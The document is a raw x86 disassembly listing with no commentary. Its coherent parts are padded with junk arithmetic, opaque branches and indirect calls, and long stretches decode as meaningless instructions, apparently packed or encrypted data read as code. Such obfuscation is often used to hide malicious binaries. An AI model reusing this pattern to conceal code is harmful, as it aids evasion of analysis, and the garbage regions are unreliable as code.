  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x428293,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x42819f,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428e3c
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x42832f
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x42826b
  41906c:	or     DWORD PTR ds:0x4283af,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
  41908f:	call   DWORD PTR [esi+0x470cbfe]
  419095:	push   0x4d
  419097:	jle    0x4190d8
  419099:	ret    
  41909a:	push   ss
  41909b:	sbb    BYTE PTR [edx+edx*1-0x6bf0e7e8],bh
  4190a2:	fdivrp st(7),st
  4190a4:	out    0xde,al
  4190a6:	call   0xa62a16bb
  4190ab:	aaa    
  4190ac:	inc    esi
  4190ad:	loope  0x419080
  4190af:	adc    ah,al
  4190b1:	add    edi,DWORD PTR [edi+eax*2]
  4190b4:	(bad)  
  4190b5:	enter  0x84e6,0x7d
  4190b9:	test   DWORD PTR [esi+0x6f],edx
  4190bc:	pop    ecx
  4190bd:	es jb  0x41905c
  4190c0:	js     0x41912e
  4190c2:	or     esp,ebp
  4190c4:	mov    dl,BYTE PTR [ebx]
  4190c6:	mov    bl,0x34
  4190c8:	mov    dl,dl
  4190ca:	test   eax,0x680f7da8
  4190cf:	cmp    al,0xce
  4190d1:	sub    al,BYTE PTR [eax]
  4190d3:	cwde   
  4190d4:	cmp    BYTE PTR ds:0xe8622f0c,ah
  4190da:	out    0x81,eax
  4190dc:	(bad)  
  4190dd:	mov    esi,0x3f9f01bc
  4190e2:	push   ds
  4190e3:	jmp    0x45700f10
  4190e8:	fldl2e 
  4190ea:	fs mov esi,0xd562f4ef
  4190f0:	jae    0x41913d
  4190f2:	xor    BYTE PTR [esi],0xc0
  4190f5:	mov    edx,0xaf048b21
  4190fa:	loop   0x4190f9
  4190fc:	dec    eax
  4190fd:	setb   BYTE PTR [ebp+0x43]
  419101:	lock repnz (bad) 
  419104:	scas   eax,DWORD PTR es:[edi]
  419105:	das    
  419106:	aas    
  419107:	xchg   edx,eax
  419108:	jns    0x419114
  41910a:	lods   eax,DWORD PTR ds:[esi]
  41910b:	sti    
  41910c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41910d:	dec    esi
  41910e:	out    0xb2,al
  419110:	mov    DWORD PTR [ebp-0x13ee8e83],esp
  419116:	jne    0x4190a4
  419118:	inc    edx
  419119:	pop    ebx
  41911a:	cmp    esi,DWORD PTR [eax]
  41911c:	inc    esi
  41911d:	rol    DWORD PTR [ebx],1
  41911f:	sbb    al,0x4e
  419121:	ret    0xf48f
  419124:	mov    ah,0x8d
  419126:	jg     0x4191a2
  419128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419129:	sbb    al,0x31
  41912b:	imul   ecx,DWORD PTR [edx-0xa256cfc],0x4c
  419132:	push   edx
  419133:	mov    ds:0xa8b6b856,al
  419138:	adc    eax,0xb67a2d1
  41913d:	(bad)  
  41913e:	rcl    BYTE PTR [esi+0x3f],cl
  419141:	pushf  
  419142:	setno  BYTE PTR [edi-0x62]
  419146:	(bad)  
  419147:	cld    
  419148:	cmp    dh,BYTE PTR [edx-0xc18efca]
  41914e:	(bad)  
  41914f:	cld    
  419150:	pop    ss
  419151:	in     eax,0x4f
  419153:	dec    edx
  419154:	sub    DWORD PTR [ecx+0x3a],eax
  419157:	adc    al,0xc
  419159:	push   edi
  41915a:	out    0x6f,al
  41915c:	lods   eax,DWORD PTR ds:[esi]
  41915d:	pop    ecx
  41915e:	fild   DWORD PTR [ecx+0x37]
  419161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419162:	ficomp WORD PTR [ecx+0x29b66794]
  419168:	out    dx,eax
  419169:	sar    BYTE PTR [bp+di-0x7a],0xf6
  41916e:	test   BYTE PTR ds:0x17721456,dh
  419174:	fild   WORD PTR [ecx+0x29]
  419177:	in     eax,0x6b
  419179:	xlat   BYTE PTR ds:[ebx]
  41917a:	(bad)  
  41917b:	fbld   TBYTE PTR [eax+eax*8]
  41917e:	and    al,0xad
  419180:	xor    BYTE PTR [esi],0x4c
  419183:	mov    ?,WORD PTR [edi+0x64]
  419186:	dec    esp
  419187:	pop    esp
  419188:	sbb    dl,BYTE PTR [edx-0x53]
  41918b:	jne    0x4191a0
  41918d:	jnp    0x419204
  41918f:	dec    ecx
  419190:	imul   ecx,DWORD PTR [esi],0xffffffed
  419193:	lods   eax,DWORD PTR ds:[esi]
  419194:	push   es
  419195:	in     al,dx
  419196:	ss mov edi,0x10ed5a2a
  41919c:	adc    dh,BYTE PTR fs:[edi+0x302eade4]
  4191a3:	mov    esp,ecx
  4191a5:	adc    al,0x8a
  4191a7:	aam    0x4d
  4191a9:	push   esi
  4191ab:	repz leave 
  4191ad:	test   al,0x8d
  4191af:	cld    
  4191b0:	outs   dx,DWORD PTR ds:[esi]
  4191b1:	ror    ebp,cl
  4191b3:	aam    0xa3
  4191b5:	(bad)  
  4191b6:	or     al,0x1d
  4191b8:	loope  0x41918c
  4191ba:	adc    eax,0x8328f8a5
  4191bf:	popf   
  4191c0:	push   edx
  4191c1:	mov    ebx,0xb4492bc1
  4191c6:	outs   dx,BYTE PTR ds:[esi]
  4191c7:	mov    WORD PTR [ebx+0x30],?
  4191ca:	out    0x81,eax
  4191cc:	call   0x1b3e:0x4ec6d8ba
  4191d3:	retf   
  4191d4:	mov    esp,0xdd1ba41e
  4191d9:	mov    ebp,0x3b4bac6b
  4191de:	xchg   esp,eax
  4191df:	dec    esi
  4191e0:	js     0x4191f9
  4191e2:	out    dx,al
  4191e3:	(bad)  
  4191e4:	icebp  
  4191e5:	std    
  4191e6:	jmp    0x2353:0x73702c0
  4191ed:	std    
  4191ee:	dec    esi
  4191ef:	mov    BYTE PTR [ecx+0x18],bh
  4191f2:	sbb    BYTE PTR [ebx-0x7322918],dh
  4191f8:	push   cs
  4191f9:	push   0xffffffc7
  4191fb:	jmp    0xa2501372
  419200:	mov    bh,0x1c
  419202:	jge    0x4191d3
  419204:	push   edi
  419205:	cmp    ebp,DWORD PTR gs:[ebp-0x12]
  419209:	out    dx,eax
  41920a:	cli    
  41920b:	in     eax,0xc7
  41920d:	xor    DWORD PTR [esi+eiz*2-0x7d966b38],ecx
  419214:	lds    esp,FWORD PTR [edi]
  419216:	add    BYTE PTR [edi-0x21c8fc2c],dl
  41921c:	jbe    0x419205
  41921e:	ficom  DWORD PTR [edx+0x40]
  419221:	cmp    eax,0xf714d3fc
  419226:	sbb    dl,0x6e
  419229:	sbb    DWORD PTR [ebx-0x1],ecx
  41922c:	test   eax,0x5efbb88f
  419231:	aas    
  419232:	iret   
  419233:	hlt    
  419234:	mov    ebp,0x6702dcbb
  419239:	pushf  
  41923a:	pop    ds
  41923b:	pop    ebp
  41923c:	ins    DWORD PTR es:[edi],dx
  41923d:	enter  0xd1d2,0x8
  419241:	add    al,0x77
  419243:	gs call 0xcaba:0x7e70b998
  41924b:	pop    edx
  41924c:	push   ebp
  41924d:	ins    BYTE PTR es:[edi],dx
  41924e:	imul   eax,DWORD PTR [ecx+0x63],0xafda59de
  419255:	sub    al,ch
  419257:	pushf  
  419258:	pop    ss
  419259:	mov    al,0xdc
  41925b:	cwde   
  41925c:	stc    
  41925d:	pop    edi
  41925e:	or     dh,BYTE PTR [eax+eiz*4-0xfcae3d0]
  419265:	xor    al,0xc7
  419267:	and    ecx,edi
  419269:	in     al,0xc5
  41926b:	fcomp  QWORD PTR [ecx+0x5f134f9b]
  419271:	clc    
  419272:	or     ch,cl
  419274:	mov    ?,WORD PTR [ebx-0x5]
  419277:	xlat   BYTE PTR ds:[ebx]
  419278:	or     BYTE PTR [edi+eiz*8-0x38ef4e51],ah
  41927f:	jmp    0x4192a2
  419281:	icebp  
  419282:	gs and esi,esp
  419285:	sbb    DWORD PTR [ebp-0x848a2e0],edx
  41928b:	out    dx,al
  41928c:	test   BYTE PTR [ebx+0x4b5abb9d],ah
  419292:	sub    ebx,DWORD PTR [esp+esi*4-0x3e]
  419296:	ret    0x7b0f
  419299:	push   ebx
  41929a:	mul    DWORD PTR [edx-0x54]
  41929d:	ret    
  41929e:	es mov al,0xac
  4192a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192a2:	stc    
  4192a3:	cmp    DWORD PTR [esi],0xffffff88
  4192a6:	jg     0x4192d5
  4192a8:	stc    
  4192a9:	aam    0xe1
  4192ab:	jns    0x419283
  4192ad:	clc    
  4192ae:	cmp    bh,ah
  4192b0:	sahf   
  4192b1:	loope  0x419247
  4192b3:	mov    eax,0xbc473533
  4192b8:	mov    al,ds:0x60415bdd
  4192bd:	xchg   esp,eax
  4192be:	inc    edi
  4192bf:	mov    cl,ah
  4192c1:	das    
  4192c2:	xor    al,0x55
  4192c4:	and    esi,edx
  4192c6:	xchg   esp,eax
  4192c7:	leave  
  4192c8:	cmp    al,dh
  4192ca:	loop   0x4192d7
  4192cc:	sti    
  4192cd:	in     al,0x34
  4192cf:	loop   0x419272
  4192d1:	retf   
  4192d2:	or     al,0xb7
  4192d4:	mov    dl,0xcc
  4192d6:	add    edx,DWORD PTR [edi-0x3d]
  4192d9:	push   es
  4192da:	push   esi
  4192db:	cmp    eax,0x8ca56781
  4192e0:	out    0xd9,eax
  4192e2:	sub    dl,BYTE PTR [esi+edi*1+0x750ffd65]
  4192e9:	enter  0x9786,0xe7
  4192ed:	xor    BYTE PTR ds:0x995e47a9,al
  4192f3:	stos   DWORD PTR es:[edi],eax
  4192f4:	pop    esp
  4192f5:	jmp    0x3d6:0x5a5d3dd
  4192fc:	dec    edx
  4192fd:	and    eax,0x34486f9b
  419302:	scas   al,BYTE PTR es:[edi]
  419303:	sbb    eax,0xa440961d
  419308:	pusha  
  419309:	les    ebx,FWORD PTR [ebp-0x3d0fdd31]
  41930f:	int3   
  419310:	fcmovnb st,st(4)
  419312:	repnz push ds
  419314:	sub    ebp,ebx
  419316:	popf   
  419317:	push   eax
  419318:	cwde   
  419319:	ror    BYTE PTR [ecx-0x7a],cl
  41931c:	mov    ds:0x70e52f95,al
  419321:	sahf   
  419322:	and    BYTE PTR [edi+0x42410f57],al
  419328:	mov    esp,0xe1793cd4
  41932d:	inc    eax
  41932e:	push   0xbe0aa9ed
  419333:	jl     0x4193a2
  419335:	xor    edx,esi
  419337:	retf   
  419338:	inc    ecx
  419339:	and    DWORD PTR [ebp-0x1d6b3c30],esi
  41933f:	pop    ebp
  419340:	out    dx,eax
  419341:	repz push 0x6f74637a
  419347:	(bad)  
  419348:	out    0xb8,al
  41934a:	das    
  41934b:	je     0x419367
  41934d:	fstp   TBYTE PTR [eax+ecx*4+0x40]
  419351:	mov    BYTE PTR [ecx+ecx*4-0x15],cl
  419355:	jle    0x419399
  419357:	sbb    BYTE PTR [esi-0x64],ah
  41935a:	fwait
  41935b:	cwde   
  41935c:	dec    ebx
  41935d:	dec    ebx
  41935e:	cmp    al,0x58
  419360:	or     eax,0xade3b2fa
  419365:	outs   dx,DWORD PTR ds:[esi]
  419366:	in     al,0x9a
  419368:	lods   al,BYTE PTR ds:[esi]
  419369:	mov    edi,0x2899d72b
  41936e:	jo     0x41931b
  419370:	jbe    0x419327
  419372:	mov    ah,0xcf
  419374:	xacquire xchg BYTE PTR [edx+0x5c],bh
  419378:	dec    eax
  419379:	jno    0x4193cd
  41937b:	mov    ch,0xb8
  41937d:	sub    DWORD PTR [edx+0x5e131a36],ebp
  419383:	push   edx
  419384:	push   esp
  419385:	push   edx
  419386:	mov    al,ds:0x6c800bc3
  41938b:	xor    eax,0xb7c81fd4
  419390:	pop    ebx
  419391:	stos   DWORD PTR es:[edi],eax
  419392:	aam    0x12
  419394:	xchg   ebx,eax
  419395:	pop    ds
  419396:	mov    ds:0xc13e181b,eax
  41939b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41939c:	lea    eax,[ebx]
  41939e:	inc    edx
  41939f:	add    al,0x6e
  4193a1:	jg     0x419338
  4193a3:	in     al,dx
  4193a4:	test   bh,0x5d
  4193a7:	cmp    al,0xe1
  4193a9:	shl    DWORD PTR [esi],1
  4193ab:	inc    eax
  4193ac:	fwait
  4193ad:	jecxz  0x4193f0
  4193af:	push   esp
  4193b0:	mov    ah,BYTE PTR [edx]
  4193b2:	imul   edi,DWORD PTR [eax],0xb4966095
  4193b8:	inc    esp
  4193b9:	mov    ebx,0x4a1790e1
  4193be:	lahf   
  4193bf:	jg     0x419357
  4193c1:	arpl   WORD PTR [ecx-0x64fe508d],ax
  4193c7:	bound  esi,QWORD PTR [esi]
  4193c9:	sub    bh,BYTE PTR [esi+0x25]
  4193cc:	xor    dl,0x99
  4193cf:	mov    al,ds:0x10023692
  4193d4:	push   0xffffff93
  4193d6:	ret    
  4193d7:	les    edx,FWORD PTR [edi+eiz*1]
  4193da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193db:	dec    ebp
  4193dc:	loop   0x419434
  4193de:	xchg   DWORD PTR [ebx-0x11cb7e9a],esp
  4193e4:	push   eax
  4193e5:	sbb    ebx,0x10f96011
  4193eb:	mov    al,ds:0x8df98e13
  4193f0:	dec    edi
  4193f1:	cmp    esi,DWORD PTR [edi-0x53]
  4193f4:	in     al,dx
  4193f5:	inc    esi
  4193f6:	ss dec ebx
  4193f8:	lods   al,BYTE PTR ds:[esi]
  4193f9:	xor    ch,bl
  4193fb:	mov    esp,gs
  4193fd:	ins    DWORD PTR es:[edi],dx
  4193fe:	jne    0x4193c4
  419400:	iret   
  419401:	and    BYTE PTR ds:0x80947b,dl
  419407:	lds    ebx,FWORD PTR [edx-0x7e248bca]
  41940d:	jns    0x41941c
  41940f:	(bad)  
  419411:	jg     0x41946d
  419413:	fldenv [edi]
  419415:	jle    0x41946c
  419417:	xchg   ebp,eax
  419418:	fldl2e 
  41941a:	or     eax,0xd19c5707
  41941f:	imul   ecx,DWORD PTR [esi+0x69],0x66a2fcdc
  419426:	pop    edi
  419427:	ins    DWORD PTR es:[edi],dx
  419428:	mov    cl,0x96
  41942a:	(bad)  
  41942b:	mov    esp,0x9ae37c51
  419430:	sub    ch,bh
  419432:	sub    DWORD PTR [esi+0x11],esi
  419435:	xor    DWORD PTR [eax+eax*2+0x4c],0x55
  41943a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41943b:	ret    0x729a
  41943e:	out    0x32,al
  419440:	mov    DWORD PTR [eax+0x59421f14],ecx
  419446:	inc    edx
  419447:	(bad)  
  419448:	enter  0xa994,0xc
  41944c:	add    al,0x40
  41944e:	leave  
  41944f:	mov    ?,WORD PTR ds:0x248c8ba0
  419455:	test   BYTE PTR [eax],al
  419457:	add    BYTE PTR [eax],al
  419459:	shrd   eax,ecx,0x2
  41945d:	cmp    DWORD PTR ds:0x42827f,0x0
  419464:	mov    DWORD PTR ds:0x4283d7,ebx
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x4283e3,0x3a28
  419482:	cmp    DWORD PTR ds:0x42827f,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428e40
  41949a:	mov    DWORD PTR ds:0x4282bb,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x428323
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x42835b,edx
  4194b2:	mov    DWORD PTR ds:0x4282e3,0x52b1
  4194bc:	or     DWORD PTR ds:0x4281bb,edx
  4194c2:	and    DWORD PTR ds:0x4283bf,ecx
  4194c8:	cmp    DWORD PTR ds:0x428367,0x0
  4194cf:	mov    DWORD PTR ds:0x428367,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x4282e3,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x4283e3,0x1b74
  4194fc:	mov    DWORD PTR ds:0x4281bf,0x3203
  419506:	cmp    DWORD PTR ds:0x428367,0x0
  41950d:	jge    0x41953e
  419513:	push   0x4280fb
  419518:	push   0x4280df
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428ed4
  419528:	adc    DWORD PTR ds:0x4281c7,0x266f
  419532:	xor    DWORD PTR ds:0x4283bf,ebx
  419538:	xor    DWORD PTR ds:0x428347,ecx
  41953e:	mov    DWORD PTR ds:0x4281b7,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x428293
  41954e:	dec    DWORD PTR ds:0x428347
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x428337,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x4283cb,0x4283e7
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x4281cf,0x0
  419589:	mov    DWORD PTR ds:0x4281bf,0x514f
  419593:	mov    DWORD PTR ds:0x4281c3,0x65eb
  41959d:	mov    DWORD PTR ds:0x428273,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x4282d3,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x4281cf,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x42808d
  4195cd:	push   0x4280a9
  4195d2:	call   DWORD PTR ds:0x428ed8
  4195d8:	adc    DWORD PTR ds:0x4282e7,ecx
  4195de:	and    DWORD PTR ds:0x4282db,0x4c04
  4195e8:	add    DWORD PTR ds:0x4281b3,ebx
  4195ee:	and    DWORD PTR ds:0x4282bf,0x6136
  4195f8:	add    DWORD PTR ds:0x4281c7,ebx
  4195fe:	mov    eax,ds:0x422598
  419603:	and    DWORD PTR ds:0x42834f,0x4282b7
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x4281ab,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x4281d3,0x4281a7
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x4282b7,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x4282e7,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x4282bf
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x4282d3,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x4281c3,0x428193
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x4282c7,0x42828f
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x4281ab
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x4281ab,0x428337
  4196ab:	push   0x42241c
  4196b0:	sbb    DWORD PTR ds:0x4282c3,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x42826b,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x42827f
  4196da:	sbb    DWORD PTR ds:0x428363,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x428293,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x4282af,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x42827b,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x4283b3,0x0
  419713:	mov    edx,DWORD PTR ds:0x42832f
  419719:	mov    edx,0x8ae
  41971e:	mov    DWORD PTR ds:0x4282ab,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x4283c3,0x5836
  419737:	cmp    DWORD PTR ds:0x4283b3,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428e44
  41974d:	movzx  edx,BYTE PTR ds:0x4281ab
  419754:	adc    DWORD PTR ds:0x428333,edx
  41975a:	movzx  edx,BYTE PTR ds:0x4282e7
  419761:	add    DWORD PTR ds:0x4281cb,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x4282df,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x4281cb,0x0
  419781:	mov    DWORD PTR ds:0x428293,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x4282ab,ebx
  419797:	cmp    DWORD PTR ds:0x4281cb,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428e48
  4197bf:	sub    DWORD PTR ds:0x4282c3,0x63b8
  4197c9:	add    DWORD PTR ds:0x42833f,0x42827f
  4197d3:	add    DWORD PTR ds:0x42829f,0x4281c7
  4197dd:	mov    ebx,DWORD PTR ds:0x4281e7
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x4282f7
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x428277,ecx
  4197f8:	and    DWORD PTR ds:0x4282cf,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x42834f
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x4281cb,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x4283b7,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x428357,0x6cf
  41984e:	mov    DWORD PTR ds:0x4283e3,0x6551
  419858:	cmp    DWORD PTR ds:0x4281cb,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428edc
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x4283eb
  419891:	mov    ecx,DWORD PTR ds:0x4283ef
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x4282db
  4198a2:	cmp    DWORD PTR ds:0x42819f,0x0
  4198a9:	mov    DWORD PTR ds:0x428193,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x42835f
  4198ba:	not    DWORD PTR ds:0x428353
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x42819f,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428e4c
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x4282c3
  4198e5:	and    DWORD PTR ds:0x42835b,edi
  4198eb:	mov    edx,DWORD PTR ds:0x42832f
  4198f1:	sbb    DWORD PTR ds:0x4281b7,edx
  4198f7:	or     DWORD PTR ds:0x428347,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x4282b3,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x42825f
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x428263
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x428357,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x42826b,0x4551
  419946:	mov    DWORD PTR ds:0x4282cf,0x487
  419950:	cmp    DWORD PTR ds:0x428357,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428e50
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
  41997e:	sbb    DWORD PTR ds:0x42832f,0x75a
  419988:	sub    DWORD PTR ds:0x4282d7,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x42827b
  419999:	sub    ecx,DWORD PTR ds:0x4283df
  41999f:	mov    DWORD PTR ds:0x42827b,ecx
  4199a5:	cmp    DWORD PTR ds:0x42829b,0x0
  4199ac:	mov    DWORD PTR ds:0x428333,0x47a6
  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x42819b,0x10c7
  4199c5:	mov    DWORD PTR ds:0x4283b7,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x42829b,edi
  4199da:	cmp    DWORD PTR ds:0x42829b,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x428273
  4199ec:	push   0x427f9b
  4199f1:	call   DWORD PTR ds:0x428ee0
  4199f7:	sub    DWORD PTR ds:0x4283e7,ecx
  4199fd:	mov    ecx,DWORD PTR ds:0x42835f
  419a03:	sbb    DWORD PTR ds:0x4282e7,ecx
  419a09:	adc    edx,DWORD PTR ds:0x4283cb
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x428347,0x29fb
  419a1f:	sbb    ecx,edx
  419a21:	xor    DWORD PTR ds:0x42833f,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x428357
  419a31:	xor    DWORD PTR ds:0x42826b,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x42826f
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx+0x48708ffa]
  419a79:	pop    esi
  419a7a:	arpl   WORD PTR [ebx+eiz*8-0x43e7e945],di
  419a81:	adc    bl,BYTE PTR [eax]
  419a83:	sbb    BYTE PTR [eax],al
  419a85:	inc    esi
  419a86:	inc    edi
  419a87:	fist   WORD PTR [esi]
  419a89:	test   DWORD PTR [ebp-0x64],esp
  419a8c:	mov    esp,0x8c8fe824
  419a91:	loope  0x419ae1
  419a93:	xor    ebp,DWORD PTR [ecx+ebx*2]
  419a96:	sub    eax,0xa78a79b9
  419a9b:	shl    BYTE PTR [esi-0xf0812d5],0xda
  419aa2:	push   0x2c
  419aa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419aa5:	jns    0x419aa7
  419aa7:	push   ss
  419aa8:	jnp    0x419a9f
  419aaa:	(bad)  
  419aab:	fwait
  419aac:	lahf   
  419aad:	aam    0x7a
  419aaf:	pop    ebp
  419ab0:	hlt    
  419ab1:	loop   0x419b2c
  419ab3:	outs   dx,DWORD PTR ds:[esi]
  419ab4:	push   es
  419ab5:	outs   dx,BYTE PTR ds:[esi]
  419ab6:	ror    dl,1
  419ab8:	jno    0x419a58
  419aba:	loop   0x419a56
  419abc:	dec    ecx
  419abd:	add    ebp,edi
  419abf:	imul   edx,DWORD PTR [edx-0x55dd7de2],0xa387b446
  419ac9:	(bad)  
  419aca:	ficom  DWORD PTR [ebx+0x43]
  419acd:	outs   dx,BYTE PTR ds:[esi]
  419ace:	mov    ebp,0x9a4da7b7
  419ad3:	pop    ds
  419ad4:	mov    al,ds:0xdcd713a2
  419ad9:	fisub  DWORD PTR ds:0xb7307ae0
  419adf:	push   esp
  419ae0:	fs fs dec ebp
  419ae3:	sahf   
